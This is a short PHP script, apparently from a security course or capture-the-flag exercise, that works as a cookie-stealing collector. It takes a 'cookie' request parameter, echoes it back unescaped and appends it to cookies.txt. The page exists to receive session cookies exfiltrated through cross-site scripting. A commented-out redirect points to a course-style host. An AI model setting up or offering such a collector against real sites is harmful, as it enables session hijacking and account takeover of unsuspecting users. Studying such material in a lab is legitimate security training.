<?php

if (isset($_REQUEST["cookie"])) {
  echo '1' . $_REQUEST["cookie"];
  $fp = fopen("cookies.txt", "a+");
  fwrite($fp, $_REQUEST["cookie"] . "\n\n");
  fclose($fp);
} else {
  echo '2';
  $fp = fopen("cookies.txt", "a+");
  fwrite($fp, "no cookie provided");
  fclose($fp);
}

//header("Location: http://kerberosclan.csec.chatzi.org/");
